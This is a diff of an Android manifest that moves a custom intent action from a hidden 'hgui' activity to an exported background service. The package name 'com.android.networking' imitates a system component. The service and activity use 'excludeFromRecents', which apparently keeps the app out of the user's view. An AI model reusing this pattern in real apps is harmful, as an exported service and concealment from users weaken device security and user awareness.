@@ -37,14 +37,15 @@
 	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@" android:allowBackup="false" >
 		<service android:name="com.android.networking.ServiceMain" android:exported="true"
 			android:excludeFromRecents="true">
+			<intent-filter>
+				<action android:name="com.android.networking.app"/>		
+			</intent-filter>
 		</service>
 		
 		<activity android:name="com.android.networking.gui.HGui"
 			android:label="hgui" android:excludeFromRecents="true"
 			android:enabled="true" android:theme="@style/Theme.Tr6871623">
 			<intent-filter>
-				<action android:name="com.android.networking.app"/>		
-				<!-- only RELEASE -->
 				<action android:name="android.intent.action.MAIN"/>
 			</intent-filter>
 		</activity>
